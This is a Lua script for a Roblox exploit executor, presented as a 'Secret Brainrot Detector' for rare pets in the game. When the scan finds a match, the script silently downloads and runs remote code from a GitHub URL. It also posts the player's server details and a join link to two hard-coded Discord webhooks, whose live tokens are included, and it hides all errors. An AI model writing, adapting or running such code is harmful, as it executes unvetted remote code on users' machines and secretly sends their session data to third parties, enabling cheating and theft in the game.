-- Secret Brainrot Detector - Auto-Load Script on Detection
-- Features: Dual webhook support, professional embed, optimized scanning, silent operation, auto-load script

-- CONFIGURATION
getgenv().webhook1 = "https://webhook.lewisakura.moe/api/webhooks/1444640545052823675/iJ67ybw1QWWYs16GH9e0Vxgs0cLVYRr0FsAhKfgWVNg3FvnT85A6vWIh6VmjZXATYe4M"
getgenv().webhook2 = "https://webhook.lewisakura.moe/api/webhooks/1441645732158509126/zUMKLS-OXAqRyVhVGQPWNC9mtuAsSEfgBobtvs_CLesVsaBfQn_m8leMvgLBV4b5fJKH"
getgenv().websiteEndpoint = nil

-- Target Secret Brainrot names to detect
getgenv().TargetPetNames = {
    "67", "Agarrini la Palini", "Bisonte Giuppitere", "Blackhole Goat",
    "Boatito Auratito", "Burrito Bandito", "Capitano Moby", "Celularcini Viciosini",
    "Chachechi", "Chicleteira Bicicleteira", "Chicleteirina Bicicleteirina",
    "Chillin Chili", "Chipso and Queso", "Chimpazini Spiderini", "Dul Dul Dul",
    "Dragon Cannelloni", "Esok Sekolah", "Eviledon", "Extinct Matteo",
    "Extinct Tralalero", "Fragrama and Chocrama", "Fragola la la la",
    "Frankentteo", "Garama and Madundung",
    "Guerriro Digitale", "Guest 666", "Headless Horseman", "Horegini Boom",
    "Jackorilla", "Job Job Job Sahur", "Karkerkar Combinasion",
    "Karker Sahur", "Ketupat Kepat", "Ketchuru and Masturu",
    "La Casa Boo", "La Extinct Grande", "La Grande Combinasion",
    "La Karkerkar Combinasion", "La Secret Combinasion", "La Spooky Grande",
    "La Supreme Combinasion", "La Taco Combinasion", "La Vacca Jacko Linterino",
    "La Vacca Staturno Saturnita", "Las Sis", "Las Tralaleritas",
    "Las Vaquitas Saturnitas", "Los 67", "Los Bros",
    "Los Crocodillitos", "Los Jobcitos", "Los Karkeritos",
    "Los Matteos", "Los Mobilis", "Los Nooo My Hotspotsitos", "Los Primos",
    "Los Puggies", "Los Spaghettis", "Los Spyderinis", "Los Spooky Combinasionas",
    "Los Tacoritas", "Los Tralaleritos", "Los Tortus", "Mariachi Corazoni",
    "Mieteteira Bicicleteira", "Money Money Puggy", "Noo my Candy",
    "Noo My Hotspot", "Noo my examine", "Orcaledon",
    "Perrito Burrito", "Pirulitoita Bicicleteira", "Pot Pumpkin",
    "Pumpkini Spyderini", "Quesadilla Crocodila", "Quesadillo Vampiro",
    "Rang Ring Bus", "Sammyni Spyderini", "Spaghetti Tualetti",
    "Spooky and Pumpky", "Swag Soda", "Tacorita Bicicleta", "Tang Tang Keletang",
    "Telemorte", "Tictac Sahur", "To To To Sahur",
    "Tortuginni Dragonfruitini", "Trickolino", "Trenostruzzo Turbo 4000",
    "Vulturino Skeletono", "Yess my examine", "Zombie Tralala"
}

-- SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

-- Create lookup table for faster matching
local targetLookup = {}
for _, name in ipairs(getgenv().TargetPetNames) do
    targetLookup[name] = true
end

-- Build ChilliHub joiner link
local function buildJoinLink()
    return string.format(
        "https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s",
        game.PlaceId,
        game.JobId
    )
end

-- Load script from URL
local function loadScript()
    local scriptUrl = "https://raw.githubusercontent.com/MM2-ScriptsZ/Lokus-Hub/refs/heads/main/legit.lua"
    local success, result = pcall(function()
        return game:HttpGet(scriptUrl)
    end)
    
    if success then
        local loadSuccess, loadError = pcall(function()
            loadstring(result)()
        end)
        
        if loadSuccess then
            return true
        else
            warn("Script execution failed: " .. tostring(loadError))
            return false
        end
    else
        warn("Failed to load script: " .. tostring(result))
        return false
    end
end

-- Enhanced Webhook Sender with professional embed design
local function sendWebhook(foundPets, jobId)
    -- Remove duplicate pets
    local uniquePets = {}
    for _, pet in ipairs(foundPets) do
        if not table.find(uniquePets, pet) then
            table.insert(uniquePets, pet)
        end
    end

    local joinLink = buildJoinLink()
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    
    -- Format pet list with better organization
    local petList = ""
    for i, pet in ipairs(uniquePets) do
        petList = petList .. string.format("• **%s**", pet)
        if i < #uniquePets then
            petList = petList .. "\n"
        end
    end
    
    -- Create professional embed design
    local embedData = {
        username = "Secret Brainrot Detector",
        embeds = { {
            title = "🔍 SECRET BRAINROTS DETECTED",
            description = "**" .. #uniquePets .. " Secret Pet(s) Found:**\n\n" .. petList,
            color = 0xFF6B6B, -- Attractive red color
            fields = {
                {
                    name = "🎮 SERVER INFORMATION",
                    value = string.format(
                        "**Game ID:** %d\n**Job ID:** %s\n**Players Online:** %d/%d",
                        game.PlaceId,
                        jobId,
                        #Players:GetPlayers(),
                        Players.MaxPlayers
                    ),
                    inline = false
                },
                {
                    name = "📊 SCAN RESULTS",
                    value = string.format(
                        "**Total Pets Scanned:** %d\n**Unique Pets Found:** %d\n**Scan Time:** %s",
                        #getgenv().TargetPetNames,
                        #uniquePets,
                        currentTime
                    ),
                    inline = false
                },
                {
                    name = "🔗 QUICK ACTIONS",
                    value = string.format(
                        "[**Join Server**](%s)\n[**View on Discord**](https://discord.gg/DXxArmEYvW)\n[**Learn More**](https://chillihub1.github.io)",
                        joinLink
                    ),
                    inline = false
                }
            },
            footer = { 
                text = "Join our Discord Community: https://discord.gg/DXxArmEYvW",
                icon_url = "https://cdn.discordapp.com/attachments/123456789012345678/987654321098765432/discord_logo.png"
            },
            timestamp = DateTime.now():ToIsoDate(),
            thumbnail = {
                url = "https://cdn.discordapp.com/attachments/123456789012345678/987654321098765432/brainrot_logo.png"
            }
        } },
        content = "🚨 ALERT: Secret brainrots detected in this server!"
    }

    local jsonData = HttpService:JSONEncode(embedData)
    
    -- Try multiple request methods with dual webhook support
    local requestMethods = {
        syn and syn.request,
        request,
        http_request,
        http and http.request,
        function(params)
            return game:GetService("HttpService"):RequestAsync({
                Url = params.Url,
                Method = params.Method,
                Headers = params.Headers,
                Body = params.Body
            })
        end
    }
    
    -- Send to both webhooks silently
    for webhookIndex, webhookUrl in ipairs({getgenv().webhook1, getgenv().webhook2}) do
        for _, req in pairs(requestMethods) do
            if type(req) == "function" then
                local success, result = pcall(function()
                    return req({
                        Url = webhookUrl,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = jsonData
                    })
                end)
                
                -- Silently continue to next method if this one fails
                if success then
                    break -- Success, move to next webhook
                end
            end
        end
    end
end

-- Optimized Pet Checker
local function checkForPets()
    local found = {}
    local startTime = tick()
    
    -- Get all descendants in workspace
    local descendants = Workspace:GetDescendants()
    
    -- Check each object
    for _, obj in pairs(descendants) do
        if obj:IsA("Model") and targetLookup[obj.Name] then
            table.insert(found, obj.Name)
        end
    end
    
    return found
end

-- Main execution - completely silent
local success, err = pcall(function()
    -- Perform the scan
    local petsFound = checkForPets()
    
    -- Process results silently
    if #petsFound > 0 then
        -- Load the additional script
        loadScript()
        
        -- Send webhook notification
        sendWebhook(petsFound, game.JobId)
    end
end)

-- Silently ignore any errors
if not success then
    -- Do nothing - completely silent
end
